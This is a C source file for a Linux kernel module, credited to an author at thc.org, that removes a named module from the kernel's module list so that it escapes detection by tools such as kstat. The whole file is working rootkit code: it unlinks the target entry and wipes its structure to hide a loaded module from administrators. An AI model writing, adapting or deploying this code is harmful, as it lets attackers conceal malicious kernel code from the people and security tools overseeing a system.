/*
 *  Copyright (C) 2003 RD <rd@thc.org>
 *  
 *  Remove 'module' from kernel module list
 *  kstat could not detect the removed module
 *  
 *  Usage: # insmod modclean.o modname=name_of_module_want_to_remove
 *  	   # rmmod modclean
 *  
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *  
 *  This program is distributed in the hope that it will be useful, but
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  General Public License for more details.
 *  
 *  See NOTICE for additional copyright notices.
 */

#include <linux/config.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/init.h>

#ifdef LINUX26

#define LIST_GET(x)	&x->list
#define LIST_NEXT(x)	x->list.next
#define LIST_DEL(x, y)	__list_del(x, y)
struct list_head __initdata *module_head;

#else

#define MODULE_NAME_LEN (64 - sizeof(unsigned long))
#define LIST_GET(pt)	pt
#define LIST_NEXT(pt)	pt->next
struct module __initdata *module_head;

#define LIST_DEL(x, y) 	\
{			\
	x->next = y; 	\
}

#endif

char __initdata *modname = NULL;
MODULE_PARM(modname, "s");
static int __init
init_modclean(void)
{
	struct module *pt, *prev, *next;

	if (!modname)
		return -1;

#ifdef LINUX26
	module_head = __this_module.list.prev;
#else
	module_head = __this_module.next;
#endif

	next = prev = &__this_module;
	if (module_head == NULL) {
		return -1;
	}
#ifdef LINUX26
	list_for_each_entry_safe(pt, next, module_head, list) {
#else
	for (pt = module_head; pt; pt = pt->next) {
#endif
		if (!strncmp(pt->name, modname, MODULE_NAME_LEN)) {
			LIST_DEL(LIST_GET(prev), LIST_NEXT(pt));
			memset(pt, 0, sizeof(struct module));
			break;
		}
		prev = pt;
	}

	return 0;
}

static void __exit
cleanup_modclean(void)
{
	//do nothing
}

module_init(init_modclean);
module_exit(cleanup_modclean);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rd@thc.org");
